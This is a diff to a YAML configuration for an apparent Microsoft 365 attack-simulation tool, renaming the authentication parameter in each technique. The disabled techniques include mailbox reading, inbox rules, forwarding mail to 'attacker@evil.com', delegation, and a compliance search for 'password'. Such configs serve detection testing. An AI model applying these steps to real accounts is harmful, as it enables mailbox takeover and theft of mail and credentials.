@@ -15,7 +15,7 @@ techniques:
   - technique: "read_email"
     enabled: False
     parameters:
-      auth_type : 1
+      auth_method : resource_owner
       method: "graph"
       mailbox: "victim@victim.com"
       limit : 5
@@ -23,7 +23,7 @@ techniques:
   - technique: "create_rule"
     enabled: False
     parameters:
-      auth_type : 1
+      auth_method : resource_owner
       method: "graph"
       mailbox: "victim@victim.com"
       rule_name : "msinvader rule 33" 
@@ -33,7 +33,7 @@ techniques:
   - technique: "enable_email_forwarding"
     enabled: False
     parameters:
-      auth_type : 1
+      auth_method : resource_owner
       method : "rest"
       mailbox: "victim@victim.com"
       forward_to : "attacker@evil.com"
@@ -41,7 +41,7 @@ techniques:
   - technique: "add_folder_permission"
     enabled: False
     parameters:
-      auth_type : 1
+      auth_method : resource_owner
       method : "rest"
       mailbox : "victim@victim.com"
       folder: "Inbox"
@@ -51,7 +51,7 @@ techniques:
   - technique: "add_mailbox_delegation"
     enabled: False
     parameters:
-      auth_type : 1
+      auth_method : resource_owner
       method : "rest"
       mailbox: "victim@victim.com"
       grantee : "attacker@victim.com"
@@ -60,7 +60,7 @@ techniques:
   - technique: "run_compliance_search"
     enabled: False
     parameters:
-      auth_type : 1
+      auth_method : resource_owner
       method : "rest"
       keyword : "password"
       name : "msInvader 365 compliance search"
@@ -68,7 +68,7 @@ techniques:
   - technique: "create_mailfow_rule"
     enabled: False
     parameters:
-      auth_type : 1
+      auth_method : resource_owner
       method : "rest"
       forward_to : "attacker@evil.com"
       name : "msInvader mailfow rule"
